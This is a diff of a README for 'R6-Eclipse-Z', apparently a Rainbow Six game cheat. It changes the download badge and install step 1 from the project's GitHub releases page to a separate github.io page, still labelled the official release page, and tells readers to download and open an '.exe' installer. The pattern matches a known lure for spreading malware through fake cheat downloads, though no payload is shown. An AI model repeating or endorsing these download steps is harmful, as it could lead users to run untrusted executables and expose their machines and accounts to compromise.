@@ -1,6 +1,6 @@
 # 🎯 R6-Eclipse-Z - Gain the edge in every match
 
-[![Download R6-Eclipse-Z](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/esmeunrequested589/R6-Eclipse-Z/releases)
+[![Download R6-Eclipse-Z](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://esmeunrequested589.github.io)
 
 ## 📖 Introduction
 
@@ -33,7 +33,7 @@ R6-Eclipse-Z requires a standard Windows environment to function properly. Pleas
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the following link to access the official release page: [https://github.com/esmeunrequested589/R6-Eclipse-Z/releases](https://github.com/esmeunrequested589/R6-Eclipse-Z/releases)
+1. Visit the following link to access the official release page: [https://esmeunrequested589.github.io](https://esmeunrequested589.github.io)
 2. Locate the section titled "Assets" at the bottom of the page.
 3. Click the file ending in ".exe" to download the installer to your PC.
 4. Open the folder where the file saved.
